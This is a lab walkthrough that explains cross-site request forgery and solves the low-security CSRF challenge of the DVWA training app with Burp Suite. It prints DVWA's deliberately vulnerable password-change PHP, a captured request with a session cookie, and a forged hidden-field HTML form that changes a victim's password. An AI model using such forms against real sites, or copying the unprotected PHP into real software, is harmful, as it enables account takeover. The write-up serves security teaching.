# Study of Cross Site Request Forgery (CSRF)

### Burp-Suite
Burp or Burp Suite is a set of tools used for penetration testing of web applications. It is developed by the company named Portswigger, which is also the alias of its founder Dafydd Stuttard. BurpSuite aims to be an all in one set of tools and its capabilities can be enhanced by installing add-ons that are called BApps.
It is the most popular tool among professional web app security researchers and bug bounty hunters. Its ease of use makes it a more suitable choice over free alternatives like OWASP ZAP. 

### CSRF
Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other.

In a successful CSRF attack, the attacker causes the victim user to carry out an action unintentionally. For example, this might be to change the email address on their account, to change their password, or to make a funds transfer. Depending on the nature of the action, the attacker might be able to gain full control over the user's account. If the compromised user has a privileged role within the application, then the attacker might be able to take full control of all the application's data and functionality.

### Solving CSRF in DVWA using Burp-Suite
The first thing that was done is checking the source code . You can simply do this in DVWA by clicking view source in the bottom right.
```
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Get input
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

    // Do the passwords match?
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update the database
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with passwords matching
        echo "<pre>Passwords did not match.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?> 

```
The script takes the user input and checks if the two passwords match, if they do the password is updated, if not the password is not updated. What we can see here is there is no protection against CSRF, such as Anti-CSRF token.

When we try to send a legitimate request from inside DVWA to change the ```New password``` paramter in CSRF challenege
```
GET /DVWA/vulnerabilities/csrf/?password_new=smit&password_conf=smiy&Change=Change HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://localhost/DVWA/vulnerabilities/csrf/
Cookie: security=low; PHPSESSID=h7ls4j5vqgj9olvdg9vedcij0f
Upgrade-Insecure-Requests: 1
```
What we can see is it is a GET request and you can see the value of the new password has been changed to **smit**

The next step is to view the html source code of the page. There is a form in there that makes a GET request. It looks just like this.

```
<form action="#" method="GET">
New password:<br />
<input type="password" AUTOCOMPLETE="off" name="password_new"><br />
Confirm new password:<br />
<input type="password" AUTOCOMPLETE="off" name="password_conf"><br />
<br />
<input type="submit" value="Change" name="Change">
```

It is the form that you see when you change the password. it takes the input from the user for a new password and confirm password. The below snippet is taken from the response body and changed according to our needs. Here the new password is **hacked by SMIT**

```
<form action=”http://localhost/DVWA-master/vulnerabilities/csrf/?" method=”GET”>
 <h1>Click Me</h1>
 <input type=”hidden” AUTOCOMPLETE=”off” name=”password_new” value=”hacked+by+smit”>
 <input type=”hidden” AUTOCOMPLETE=”off” name=”password_conf” value=”hacked+by+smit”>
 <input type=”submit” value=”Change” name=”Change”>
</form>
```
